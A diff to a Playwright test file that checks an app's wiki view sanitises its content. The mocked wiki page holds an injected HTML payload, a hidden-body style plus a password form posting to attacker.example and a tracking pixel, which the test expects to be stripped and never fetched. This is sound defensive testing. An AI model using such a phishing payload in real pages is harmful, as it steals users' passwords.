@@ -128,6 +128,11 @@ test('Room card and explicit promotion use the durable main human chat', async (
 test('Wiki presents caretaker synthesis and never exposes the raw Updates feed', async ({ page }) => {
   await page.setViewportSize({ width: 390, height: 844 })
   let updateRequests = 0
+  let remoteMediaRequests = 0
+  await page.route('https://attacker.example/**', async (route) => {
+    remoteMediaRequests++
+    await route.abort()
+  })
   await page.route('**/api/rooms', async (route) => {
     await route.fulfill({ json: { rooms: [{
       name: 'meta', cwd: '/srv/rooms/meta', active: false, latest: null, updatedAt: '2026-08-22T13:30:00Z',
@@ -140,10 +145,10 @@ test('Wiki presents caretaker synthesis and never exposes the raw Updates feed',
   await page.route('**/api/rooms/meta/wiki', async (route) => {
     await route.fulfill({ json: { pages: [{ name: 'Home', size: 80, updatedAt: '2026-08-22T14:00:00Z' }] } })
   })
-  await page.route('**/api/rooms/meta/wiki/page?name=Home', async (route) => {
+  await page.route('**/api/rooms/meta/wiki/page**', async (route) => {
     await route.fulfill({ json: {
       name: 'Home',
-      content: '# Meta knowledge\\n\\nThe caretaker synthesized the evidence into this durable conclusion.',
+      content: '# Meta knowledge\n\nThe caretaker synthesized the evidence into this durable conclusion.\n\n<style>body{display:none}</style><form action=\"https://attacker.example/steal\"><input name=\"password\"></form>![pixel](https://attacker.example/pixel)',
       updatedAt: '2026-08-22T14:00:00Z',
     } })
   })
@@ -162,6 +167,8 @@ test('Wiki presents caretaker synthesis and never exposes the raw Updates feed',
   await expect(panel).not.toContainText('RAW COPIED TWEET')
   await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
   expect(updateRequests).toBe(0)
+  await expect(panel.locator('style, form, input, img')).toHaveCount(0)
+  expect(remoteMediaRequests).toBe(0)
 })
 
 test('shows friction only on the Room that reported it', async ({ page }) => {
